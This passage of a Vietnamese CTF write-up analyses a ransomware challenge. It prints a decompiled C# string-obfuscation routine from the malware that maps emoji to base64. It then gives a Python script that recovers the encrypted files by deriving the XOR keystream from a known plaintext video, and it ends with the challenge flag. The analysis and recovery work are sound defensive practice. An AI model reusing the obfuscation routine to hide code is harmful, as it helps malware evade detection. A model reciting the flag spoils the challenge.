      cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDDFF\uD83D\uDC7B\uD83D\uDEBE\uD83C\uDFA9\uD83D\uDC23ℹ️\uD83D\uDE82\uD83D\uDC5E\uD83D\uDD01\uD83C\uDF7B\uD83D\uDDFF\uD83C\uDF67"),
      cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDCAF\uD83D\uDD38\uD83D\uDC5E\uD83C\uDF63⏩ℹ️\uD83D\uDEBE\uD83C\uDF67"),
      cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDD1C\uD83D\uDC7B\uD83D\uDC5E\uD83C\uDFA9\uD83D\uDC23\uD83C\uDE51\uD83D\uDCAF\uD83C\uDF46⏩\uD83D\uDCC9\uD83D\uDC36\uD83D\uDD0C"),
      cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDD28\uD83D\uDCC9\uD83D\uDCAF\uD83C\uDF679️⃣ℹ️\uD83D\uDC36\uD83D\uDD0C"),
      cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd("\uD83D\uDDFF\uD83D\uDC7B\uD83D\uDCAF\uD83C\uDF679️⃣⚽\uD83D\uDDFF\uD83D\uDCBF\uD83D\uDCD3\uD83D\uDC3D\uD83D\uDD0C\uD83D\uDD0C")
    }, pubKey);
  }

  private static string NxfINLZaaZZezaCgDHsGdzSaNiURAmtiyEBgprNsxjKzd(string java)
  {
    string str1 = (string) null;
    StringInfo stringInfo = new StringInfo(java);
    for (int index = 0; index < stringInfo.LengthInTextElements; ++index)
    {
      string str2 = stringInfo.SubstringByTextElements(index, 1);
      foreach (KeyValuePair<string, string> keyValuePair in cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.pdZuVvKNPFSscmrJcOBSJjLEW)
      {
        if (string.op_Equality(keyValuePair.Value, str2))
          str1 += ((object) keyValuePair.Key).ToString();
      }
    }
    return Encoding.UTF8.GetString(Convert.FromBase64String(str1));
  }

  static cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk()
  {
    Dictionary<string, string> dictionary = new Dictionary<string, string>();
    dictionary.Add("0", "\uD83C\uDF7A");
    dictionary.Add("1", "\uD83D\uDE82");
    dictionary.Add("2", "\uD83D\uDC0F");
    dictionary.Add("3", "⚽");
    dictionary.Add("4", "\uD83C\uDE3A");
    dictionary.Add("5", "⛵");
    dictionary.Add("6", "\uD83D\uDD3C");
    dictionary.Add("7", "\uD83C\uDF4D");
    dictionary.Add("8", "\uD83C\uDFA5");
    dictionary.Add("9", "\uD83D\uDEBE");
    dictionary.Add("A", "\uD83D\uDC3D");
    dictionary.Add("B", "\uD83C\uDF0A");
    dictionary.Add("C", "\uD83D\uDCAC");
    dictionary.Add("D", "\uD83C\uDFAD");
    dictionary.Add("E", "\uD83C\uDF06");
    dictionary.Add("F", "\uD83D\uDD0E");
    dictionary.Add("G", "\uD83D\uDC7B");
    dictionary.Add("H", "\uD83C\uDE51");
    dictionary.Add("I", "\uD83D\uDC9B");
    dictionary.Add("J", "\uD83C\uDD7F️");
    dictionary.Add("K", "\uD83C\uDDEA\uD83C\uDDF8");
    dictionary.Add("L", "\uD83D\uDC9C");
    dictionary.Add("M", "\uD83D\uDC36");
    dictionary.Add("N", "\uD83C\uDF8F");
    dictionary.Add("O", "\uD83D\uDC60");
    dictionary.Add("P", "\uD83C\uDF83");
    dictionary.Add("Q", "\uD83C\uDF75");
    dictionary.Add("R", "\uD83D\uDDFF");
    dictionary.Add("S", "\uD83D\uDEB9");
    dictionary.Add("T", "\uD83D\uDD28");
    dictionary.Add("U", "\uD83D\uDD1C");
    dictionary.Add("V", "\uD83D\uDCAF");
    dictionary.Add("W", "ℹ️");
    dictionary.Add("X", "\uD83D\uDCC9");
    dictionary.Add("Y", "\uD83C\uDE01");
    dictionary.Add("Z", "⏩");
    dictionary.Add("a", "9️⃣");
    dictionary.Add("b", "\uD83D\uDD01");
    dictionary.Add("c", "\uD83D\uDCD3");
    dictionary.Add("d", "\uD83D\uDC23");
    dictionary.Add("e", "\uD83D\uDC58");
    dictionary.Add("f", "\uD83C\uDF6F");
    dictionary.Add("g", "\uD83D\uDCBB");
    dictionary.Add("h", "\uD83D\uDE8F");
    dictionary.Add("i", "\uD83D\uDC8B");
    dictionary.Add("j", "\uD83C\uDFA9");
    dictionary.Add("k", "\uD83C\uDF63");
    dictionary.Add("l", "\uD83D\uDC5E");
    dictionary.Add("m", "\uD83D\uDD38");
    dictionary.Add("n", "\uD83C\uDF7B");
    dictionary.Add("o", "\uD83D\uDC9A");
    dictionary.Add("p", "\uD83C\uDF87");
    dictionary.Add("q", "\uD83D\uDE9B");
    dictionary.Add("r", "\uD83D\uDC88");
    dictionary.Add("s", "\uD83C\uDFC8");
    dictionary.Add("t", "\uD83D\uDE0D");
    dictionary.Add("u", "\uD83D\uDEB4");
    dictionary.Add("v", "\uD83D\uDCBF");
    dictionary.Add("w", "\uD83D\uDC8F");
    dictionary.Add("x", "✒️");
    dictionary.Add("y", "\uD83C\uDF46");
    dictionary.Add("z", "\uD83C\uDF67");
    dictionary.Add("_", "\uD83D\uDD52");
    dictionary.Add("-", "\uD83D\uDC4C");
    dictionary.Add("/", "\uD83D\uDC2E");
    dictionary.Add("+", "\uD83D\uDC2D");
    dictionary.Add("=", "\uD83D\uDD0C");
    cTIvrRALJgAKjCWOQufOPTJJhWwTDtRCwkk.pdZuVvKNPFSscmrJcOBSJjLEW = dictionary;
  }
}
```

đoạn này mình nhờ chatGPT decode thì nó ra như sau 
<img width="885" height="642" alt="image" src="https://github.com/user-attachments/assets/88c79e07-ef98-4f41-baec-10b162c1b005" />

từ đây mình sẽ bắt đầu quá trình khôi phục các file .EHC 
mình có thể tận dụng lỗi của attacker khi giữ lại file video.mp4 , kết hợp file này và file video.mp4 sau khi bị mã hóa thì có thể rút ra keystream dùng để XOR (chu kỳ ~32 byte) của ransomware.

mình dùng script sau để lấy keystream 

```#!/usr/bin/env python3
# usage:
#   python3 derive_xor_key.py --plain /home/bawc/HolaCTF/evidence/stage3/video.mp4 \
#                             --root  /home/bawc/HolaCTF/evidence/stage3/output
# (hoặc chỉ định --enc trực tiếp)

import argparse, os, collections
from pathlib import Path

HEAD = 2_000_000     # đọc tối đa 2MB đầu, đủ để vote khoá
PERIOD = 32

def read_head(path: Path, n: int) -> bytes:
    with path.open("rb") as f: return f.read(n)

def pick_enc_candidate(root: Path, plain: Path) -> Path | None:
    """chọn .EHC cùng size; ưu tiên ứng viên tạo 'ftyp' ở offset 4 sau khi XOR."""
    size = plain.stat().st_size
    best, best_score = None, -1
    p_head = read_head(plain, 4096)
    for enc in root.rglob("*.EHC"):
        try:
            if enc.stat().st_size != size: 
                continue
            e_head = read_head(enc, 4096)
            dec = bytes(e_head[i] ^ p_head[i] for i in range(min(len(e_head), len(p_head))))
            score = 0
            if len(dec) >= 8 and dec[4:8] == b"ftyp": score += 100  # MP4 chắc chắn
            # điểm ASCII để phân biệt nếu có nhiều ứng viên
            score += sum(32 <= b < 127 or b in (9,10,13) for b in dec[:256])
            if score > best_score:
                best, best_score = enc, score
        except Exception:
            continue
    return best

def vote_keystream(plain: bytes, enc: bytes) -> list[int | None]:
    """bỏ phiếu cho từng vị trí i%32 bằng E^P, chọn giá trị xuất hiện nhiều nhất."""
    n = min(len(plain), len(enc), HEAD)
    votes = [collections.Counter() for _ in range(PERIOD)]
    for i in range(n):
        votes[i % PERIOD][enc[i] ^ plain[i]] += 1
    ks = [None]*PERIOD
    for i,ctr in enumerate(votes):
        if ctr: ks[i] = ctr.most_common(1)[0][0]
    return ks

def ks_to_hex(ks: list[int | None]) -> str:
    return "".join("??" if x is None else f"{x:02x}" for x in ks)

def main():
    ap = argparse.ArgumentParser(description="Derive 32-byte XOR keystream from MP4 & matching .EHC")
    ap.add_argument("--plain", required=True, help="/home/bawc/HolaCTF/evidence/stage3/video.mp4")
    ap.add_argument("--root",  required=False, default=".", help="/home/bawc/HolaCTF/evidence/stage3/output")
    ap.add_argument("--enc",   required=False, help="xrYvsozYaitKuzsiktrX.EHC")
    args = ap.parse_args()

    plain = Path(args.plain)
    if not plain.is_file(): raise SystemExit(f"Không thấy file plain: {plain}")
    root  = Path(args.root)

    if args.enc:
        enc_path = Path(args.enc)
        if not enc_path.is_file(): raise SystemExit(f"Không thấy file enc: {enc_path}")
    else:
        enc_path = pick_enc_candidate(root, plain)
        if not enc_path:
            raise SystemExit("Không tìm được file .EHC có cùng kích thước với video.mp4")
    print(f"[+] Cặp dùng để rút key:\n    PLAIN: {plain}\n    ENC  : {enc_path}")

    P = read_head(plain, HEAD)
    E = read_head(enc_path, HEAD)
    ks = vote_keystream(P, E)
    hexks = ks_to_hex(ks)
    missing = [i for i,x in enumerate(ks) if x is None]
    print(f"[+] KS32 = {hexks}")
    if missing:
        print(f"[!] Còn thiếu vị trí: {missing} (nhưng với MP4 thường đã đủ để giải)")

    # lưu artefacts
    key_bytes = bytes(x if x is not None else 0 for x in ks)
    Path("key.bin").write_bytes(key_bytes)
    Path("key_hex.txt").write_text(" ".join(f"0x{b:02x}" for b in key_bytes)+"\n", encoding="utf-8")
    print("[+] Done")

if __name__ == "__main__":
    main()
```
sau khi chạy xong xor_key.py mình sẽ nhận đc chuỗi KS32 và ghi lại rồi sử dụng trong decrypt_folder.py để khôi phục các file bị mã hóa.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d7eba98b-d82d-4c99-82c7-c52872aeb61b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0be16ac5-fca1-4538-bb52-a6acf020954a" />

sau khi khôi phục được mình kiểm tra các file đó và thấy trong file TYTUTtTtkPuXsZaiwiKa.txt có text như trên, dựa theo đây mình cũng đoán nó là file cần tìm.
<img width="826" height="104" alt="image" src="https://github.com/user-attachments/assets/0b8249b9-2e75-4aad-8a8d-b78072fa115a" />

cuối cùng là flag : HOLACTF{dUN6_BAo_91O_Cl1ck_vaO_STRAN6e_FlLe_nH3_aHuhu_6930f7c9bb4e}


